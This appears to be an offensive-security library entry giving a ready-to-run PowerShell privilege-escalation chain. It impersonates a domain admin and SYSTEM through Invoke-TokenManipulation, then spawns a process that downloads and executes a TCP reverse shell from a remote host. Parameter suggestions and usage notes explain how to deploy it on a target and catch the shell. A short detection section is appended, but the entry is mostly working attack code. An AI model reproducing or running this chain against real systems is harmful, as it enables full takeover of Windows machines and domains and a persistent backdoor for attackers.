---
id: 9452b0ee-76ac-43df-8928-67e375b870bd
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:30.139666+00:00'
updated_at: '2023-04-10T20:37:38.235079+00:00'
platforms:
  - Windows
tags:
  - token-impersonation
  - privilege-escalation
  - reverse-shell
validated: true
---

# PowerShell-Token-Impersonation-with-Reverse-Shell

## Code

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\";"
```

## Description

This PowerShell script uses the Invoke-TokenManipulation function to impersonate a domain admin and then SYSTEM account, followed by creating an elevated PowerShell process from wininit that downloads and executes a TCP reverse shell script. It enables full system compromise by establishing a privileged backdoor.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| lab\domainadminuser | Domain user to initially impersonate | contoso\admin |
| NT AUTHORITY\SYSTEM | System account for full elevation | NT AUTHORITY\LocalService |
| wininit | Privileged process to source token from | lsass |
| http://10.7.253.6:82/Invoke-PowerShellTcp.ps1 | URL to reverse shell script | http://attacker.com/shell.ps1 |

## Usage

Load Invoke-TokenManipulation (e.g., from PowerSploit) on the target via initial access. Run in an elevated or user context; it will escalate and spawn the reverse shell. Set up a listener (e.g., netcat) on the attacker side before execution to catch the connection.

## Detection

- PowerShell ScriptBlock logging showing Invoke-TokenManipulation calls.
- Network connections to external IPs on non-standard ports.
- Process creation from wininit with PowerShell child processes (Sysmon EID 1/5).
- AMSI scans for downloadstring and IEX patterns.

## Related

- [[procedures/Elevating-Privileges-via-RottenPotato-and-Token-Impersonation]]
